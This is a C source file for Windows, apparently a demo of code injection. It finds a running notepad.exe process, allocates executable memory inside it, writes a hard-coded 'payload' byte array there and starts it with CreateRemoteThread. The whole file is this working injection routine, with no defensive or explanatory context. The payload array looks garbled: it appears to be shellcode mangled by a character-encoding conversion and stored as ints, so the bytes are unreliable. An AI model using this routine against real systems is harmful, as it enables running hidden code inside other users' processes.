#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>

unsigned int payload[] = {0x41,0xe2,0x98,0xba,0xe2,0x94,0xb4,0x38,0xce,0xb1,0x75,0xc2,0xb1,0x4c,0xe2,0x99,0xa5,0x4c,0x45,0x39,0xe2,0x95,0xa4,0x75,0xe2,0x95,0xaa,0x58,0x44,0xc3,0xaf,0x40,0x24,0x49,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x66,0x41,0xc3,0xaf,0xe2,0x99,0x80,0x48,0x44,0xc3,0xaf,0x40,0xe2,0x88,0x9f,0x49,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x41,0xc3,0xaf,0xe2,0x99,0xa6,0xc3,0xaa,0x48,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0xc3,0xa2,0xe2,0x88,0x9e,0x20,0x41,0x52,0xc2,0xa0,0xce,0xb1,0x58,0x41,0x59,0x5a,0x48,0xc3,0xaf,0xe2,0x86,0x95,0xce,0x98,0x57,0xc2,0xa0,0xc2,0xa0,0xc2,0xa0,0x5d,0x48,0xe2,0x95,0x91,0xe2,0x98,0xba,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x48,0xc3,0xac,0xc3,0xac,0xe2,0x98,0xba,0xe2,0x98,0xba,0x20,0x20,0x41,0xe2,0x95,0x91,0x31,0xc3,0xaf,0x6f,0xc3,0xa7,0xc2,0xa0,0xe2,0x95,0x92,0xe2,0x95,0x97,0xce,0xb1,0xe2,0x86,0x94,0x2a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x41,0xe2,0x95,0x91,0xc2,0xaa,0xc3,0xb2,0xe2,0x95,0x9c,0xc2,0xa5,0xc2,0xa0,0xe2,0x95,0x92,0x48,0xc3,0xa2,0xe2,0x94,0x80,0x28,0x3c,0xe2,0x99,0xa0,0x7c,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0xc3,0x87,0xe2,0x88,0x9a,0xce,0xb1,0x75,0xe2,0x99,0xa3,0xe2,0x95,0x97,0x47,0xe2,0x80,0xbc,0x72,0x6f,0x6a,0x20,0x59,0x41,0xc3,0xab,0xe2,0x94,0x8c,0xc2,0xa0,0xe2,0x95,0x92,0x6e,0x6f,0x74,0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65};

HANDLE getTargetProc() {
	DWORD aProcesses[1024], cbNeeded, cProcesses;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
		return INVALID_HANDLE_VALUE;
		
	cProcesses = cbNeeded / sizeof(DWORD);
		
	for (int i = 0; i < cProcesses; i++ ) {
	    if( aProcesses[i] != 0 ) {
	        TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
	        				PROCESS_VM_READ |
						PROCESS_VM_WRITE |
						PROCESS_VM_OPERATION,
						FALSE,
						aProcesses[i] );
	    if (NULL != hProcess ) {
	        HMODULE hMod;
	        DWORD cbNeeded;
		
	        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
	            GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
	    }
		
	    if (strncmp(szProcessName, "notepad.exe", 11) == 0)
	        return hProcess;
	
	    CloseHandle( hProcess );
	    }
	}
	return INVALID_HANDLE_VALUE;
}

int main() {
	HANDLE targetProc = getTargetProc();
	if (targetProc == INVALID_HANDLE_VALUE) {
		printf("target process couldn't be gathered...\n");
		return 1;
	}
	else
		printf("target process is OK\n");

	/*
	LPVOID VirtualAllocEx(
[in] HANDLE hProcess,
[in, optional] LPVOID lpAddress,
[in] SIZE_T dwSize,
[in] DWORD flAllocationType,
[in] DWORD flProtect
);
	*/
	LPVOID baseAddress = VirtualAllocEx(targetProc, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (baseAddress == NULL) {
		printf("VirtualAlloc couldn't allocate the memory\n\t%lu\n", GetLastError());
		return 1;
	}
	else
		printf("VirtualAlloc OK\n");

	/*
	BOOL WriteProcessMemory(
[in] HANDLE hProcess,
[in] LPVOID lpBaseAddress,
[in] LPCVOID lpBuffer,
[in] SIZE_T nSize,
[out] SIZE_T *lpNumberOfBytesWritten
);
	*/
	SIZE_T sizeBytesWritten;
	if (!WriteProcessMemory(targetProc, baseAddress, payload, sizeof(payload), &sizeBytesWritten)) {
		printf("WriteProcessMemory couldn't write the payload...\n\t%lu\n", GetLastError());
		return 1;
	}
	else
		printf("WriteProcessMemory OK\n");

	/*
	HANDLE CreateRemoteThread(
[in] HANDLE hProcess,
[in] LPSECURITY_ATTRIBUTES lpThreadAttributes,
[in] SIZE_T dwStackSize,
[in] LPTHREAD_START_ROUTINE lpStartAddress,
[in] LPVOID lpParameter,
[in] DWORD dwCreationFlags,
[out] LPDWORD lpThreadId
);
	*/
	if (CreateRemoteThread(targetProc, NULL, 0, baseAddress, NULL, 0, NULL) == NULL) {
		printf("CreateRemoteThread couldn't create the thread...\n\t%lu\n", GetLastError());
		CloseHandle(targetProc);
		return 1;
	}
	else {
		printf("CreateRemoteThread OK\n");
		CloseHandle(targetProc);
		return 0;
	}

}
